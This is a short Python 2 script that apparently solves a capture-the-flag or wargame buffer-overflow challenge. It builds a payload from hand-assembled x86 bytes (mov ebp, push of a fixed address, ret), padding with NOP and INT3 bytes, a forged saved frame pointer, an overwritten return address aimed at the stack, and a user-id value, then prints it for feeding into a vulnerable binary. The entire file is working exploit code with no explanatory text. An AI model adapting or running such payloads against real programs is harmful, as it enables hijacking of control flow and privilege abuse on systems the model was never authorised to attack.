import struct

ebp = struct.pack("I",0xffefffcc)

eip = struct.pack("I",0xffefffc4) #point bof
edx = "\xE8\x03\x00\x00"
mov_ebp_ffefffd0 = "\xBD\xD0\xFF\xEF\xFF"
push_80492a2 = "\x68\xA2\x92\x04\x08"
ret = "\xC3"
uid = edx 
exx = struct.pack("I",0x8049370)
ebp=exx
payload = mov_ebp_ffefffd0 + push_80492a2 + ret
print payload + '\x90' + '\xCC'*8 + ebp + eip + exx + uid
#print payload + edx + ebp + eip 
